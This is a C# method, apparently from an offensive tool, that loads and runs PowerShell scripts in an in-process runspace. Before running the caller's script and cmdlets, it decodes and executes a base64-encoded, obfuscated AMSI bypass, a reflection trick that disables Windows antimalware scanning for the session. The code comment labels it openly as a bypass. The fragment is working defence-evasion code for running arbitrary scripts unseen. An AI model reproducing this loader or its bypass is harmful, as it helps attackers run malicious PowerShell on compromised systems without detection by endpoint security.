using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.DirectoryServices.AccountManagement;
using System.DirectoryServices.Protocols;
using System.Collections;
using System.Security;
using System.Security.Principal;
using System.Collections.Specialized;
using System.Security.AccessControl;
using System.Security;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Remoting;
using System.Management.Automation.Runspaces;
using System.Threading;

public string ps1loader(string script, string[] cmdlet)
        {
            StringWriter sw = new StringWriter();
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            //ps.AddScript("powershell -v 2");

            // bypassing amsi in our new powershell session
            byte[] amsibypass = System.Convert.FromBase64String("U2BlVC1JdGBlbSAoICdWJysnYVInICsgICdJQScgKyAoJ2JsRToxJysncTInKSAgKyAoJ3VaJysneCcpICApICggW1RZcEVdKCAgInsxfXswfSItRidGJywnckUnICApICkgIDsgICAgKCAgICBHZXQtdmFySWBBYEJMRSAgKCAoJzFRJysnMlUnKSAgKyd6WCcgICkgIC1WYUwgICkuIkFgc3NgRW1ibHkiLiJHRVRgVFlgUGUiKCggICJ7Nn17M317MX17NH17Mn17MH17NX0iIC1mKCdVdGknKydsJyksJ0EnLCgnQW0nKydzaScpLCgnLk1hbicrJ2FnZScrJ21lbicrJ3QuJyksKCd1JysndG8nKydtYXRpb24uJyksJ3MnLCgnU3lzdCcrJ2VtJykgICkgKS4iZ2BldGZgaUVsRCIoICAoICJ7MH17Mn17MX0iIC1mKCdhJysnbXNpJyksJ2QnLCgnSScrJ25pdEYnKydhaWxlJykgICksKCAgInsyfXs0fXswfXsxfXszfSIgLWYgKCdTJysndGF0JyksJ2knLCgnTm9uJysnUHVibCcrJ2knKSwnYycsJ2MsJyAgKSkuInNFYFRgVmFMVUUiKCAgJHtuYFVMbH0sJHt0YFJ1RX0gKQ==");
            ps.AddScript(System.Text.Encoding.UTF8.GetString(amsibypass));
            ps.Invoke();
            ps.Commands.Clear();


            ps.AddScript(script);
            ps.Invoke();
            ps.Commands.Clear();

            string cmd = null;
            for (int i = 1; i < cmdlet.Length; i++)
            {
                cmd += cmdlet[i] + " ";
            }


            ps.AddScript(cmd);




            ps.AddCommand("format-list");
            ps.AddCommand("out-string");

           
            System.Collections.ObjectModel.Collection<PSObject> output = ps.Invoke();


            //var error = ps.Error.ReadToEnd();
            if (ps.HadErrors)
            {
                sw.WriteLine(output.ToString());
                return sw.ToString();
            }

            sw.WriteLine(String.Join("\n", output));

            rs.Close();
            Runspace.DefaultRunspace = null;

            return sw.ToString();



        }

